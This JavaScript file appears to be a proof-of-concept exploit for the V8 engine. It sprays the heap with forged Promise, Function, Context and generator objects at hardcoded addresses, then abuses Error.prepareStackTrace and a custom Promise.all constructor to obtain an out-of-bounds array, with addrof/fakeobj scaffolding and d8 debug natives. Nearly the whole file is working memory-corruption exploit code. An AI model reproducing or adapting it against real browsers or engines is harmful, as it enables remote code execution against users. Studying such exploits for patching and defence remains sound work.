function ftoi(val) {
  var buf = new ArrayBuffer(8);
  var f64_buf = new Float64Array(buf);
  var u64_buf = new Uint32Array(buf);

  f64_buf[0] = val;
  return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
  var buf = new ArrayBuffer(8);
  var f64_buf = new Float64Array(buf);
  var u64_buf = new Uint32Array(buf);

  u64_buf[0] = Number(val & 0xffffffffn);
  u64_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}

function itoh(value) {
  return value.toString(16);
}

const sloppy_func_addr = 0x0004e195n;
const fake_objs_elems_addr = 0x0004f275n;
const oob_arr_draft_elem_addr = 0x0004f2fdn;

const sloppy_func = () => {};

const fake_objs = new Array(
  /* +0x08 */ itof(0x000002190018ed75n), // OOB PACKED_DOUBLE_ELEMENTS Array
  /* +0x10 */ itof((0x42424242n << 32n) | oob_arr_draft_elem_addr),
  /* +0x18 */ itof(0x00000000000013cdn), // PromiseReaction
  /* +0x20 */ itof(((fake_objs_elems_addr + 0x30n) << 32n) | 0x00000251n),
  /* +0x28 */ itof(0x0000025100000251n),
  /* +0x30 */ itof(0x00000219001843bdn), // Function
  /* +0x38 */ itof(0x00043c8000000219n),
  /* +0x40 */ itof(((fake_objs_elems_addr + 0x48n) << 32n) | 0x00025575n), // shared_info
  /* +0x48 */ itof(0x0000000600191935n), // Context
  /* +0x50 */ itof(0x0000021900006285n),
  /* +0x58 */ itof(0x0000021900000000n | (fake_objs_elems_addr + 0x60n)),
  /* +0x60 */ itof(0x000002190018f3f9n), // JSGeneratorObject
  /* +0x68 */ itof((sloppy_func_addr << 32n) | 0x00000219n),
  /* +0x70 */ itof(((fake_objs_elems_addr + 0x8n) << 32n) | 0x0019c5b5n), // context: addr <ScriptContext[8]>
  /* +0x78 */ itof(0x00000000000000a8n),
  /* +0x80 */ itof(0x0000021900000000n)
);

var addrof_arr = [{}, 668];
var fakeobj_arr = [itof(0x7777777877777778n)];

var promise = [
  itof(0x000002190018b5a9n << 8n),
  itof((((fake_objs_elems_addr + 0x18n) << 32n) | 0x00000219n) << 8n),
  itof(0x0000000000000000n << 8n),
];

var arr1 = new Array(1.1, 1.2);
for (let i = 0; i < 0xc00; i++) {
  arr1.push(promise[0]);
  arr1.push(promise[1]);
  arr1.push(promise[2]);
  arr1.push(promise[3]);
}
var arr2 = new Array(1.1, 1.2);
for (let i = 0; i < 0xc00; i++) {
  arr2.push(promise[0]);
  arr2.push(promise[1]);
  arr2.push(promise[2]);
  arr2.push(promise[3]);
}
var arr3 = new Array(1.1, 1.2);
for (let i = 0; i < 0x400; i++) {
  arr3.push(promise[0]);
  arr3.push(promise[1]);
  arr3.push(promise[2]);
  arr3.push(promise[3]);
}

var oob_arr;

Error.prepareStackTrace = function (error, frames) {
  if (frames.length < 3) {
    console.log("[+] frames.length < 3");
  } else {
    console.log("[+] frames.length >= 3");
    oob_arr = frames[2].getThis();
  }
};

var closure;

function Constructor(executor) {
  executor(
    () => {},
    () => {}
  );
}

Constructor.resolve = function (v) {
  return v;
};

let p1 = {
  then(onFul, onRej) {
    closure = onFul;
    closure(1);
  },
};

async function boo(x) {
  await bar(x).then(closure);
}

async function bar(x) {
  await x;
  throw new Error("Let's have a look...");
}

async function foo() {
  await Promise.all.call(Constructor, [p1]);
  console.log("[+]");
  %DebugPrint(sloppy_func);
  console.log("[+]");
  %DebugPrint(fake_objs);
  console.log("[+]");
  %DebugPrint(promise);
  console.log("[+]");
  %DebugPrint(closure);
  console.log("[+]");
  %DebugPrint(addrof_arr);
  console.log("[+]");
  %SystemBreak();
  boo(1).catch((e) => {
    e.stack;
    if (oob_arr == undefined) {
      console.log("[+] oob failed");
    }
    console.log("[+] oob successful");
  });
}

foo();
